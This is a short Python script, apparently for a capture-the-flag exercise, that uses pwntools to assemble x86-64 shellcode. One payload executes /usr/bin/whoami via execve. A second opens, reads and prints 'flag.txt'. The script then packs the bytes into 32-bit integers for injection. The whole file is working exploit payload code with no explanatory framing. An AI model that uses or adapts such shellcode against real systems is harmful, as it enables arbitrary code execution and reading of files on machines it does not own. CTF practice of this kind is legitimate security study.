from pwn import * 
context.arch='amd64'

shellcode=asm('''
    
        mov rax,59
        mov rsi,0
        mov rdx,0
        lea rdi ,[rip+binsh]
        syscall
        binsh:
        .string "/usr/bin/whoami"
        
''')
shellcode=asm('''
        mov rax,2
        mov rsi,0
        mov rdx,0
        lea rdi ,[rip+file]
        syscall
        mov rdi ,rax
        mov rsi,rsp
        mov rdx,0x50
        mov rax , 0
        syscall
        mov rdi,1
        mov rsi,rsp
        mov rdx,0x50
        mov rax , 1
        syscall
        file:
        .string "flag.txt"
''')
parts=[u32(shellcode[i:i+4].ljust(4,b'\x00')) for i in range(0, len(shellcode), 4)]
print(parts)